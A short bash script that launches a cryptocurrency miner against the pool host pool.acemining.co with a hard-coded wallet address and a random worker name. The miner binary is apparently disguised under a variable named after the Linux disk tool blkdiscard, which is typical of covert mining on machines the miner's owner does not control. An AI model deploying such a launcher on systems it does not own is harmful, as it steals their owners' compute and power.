#!/bin/bash

echo "------------------------START Miner----------------------"
./$blkdiscard -t cuda -a "NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL" -n $(echo $(shuf -i 1-20000 -n 1)-GG) -p pool.acemining.co:8443 --threads 1 --cache 2 --cpu-priority 0
echo "------------------------END Miner----------------------"
echo "something went wrong or you exited"
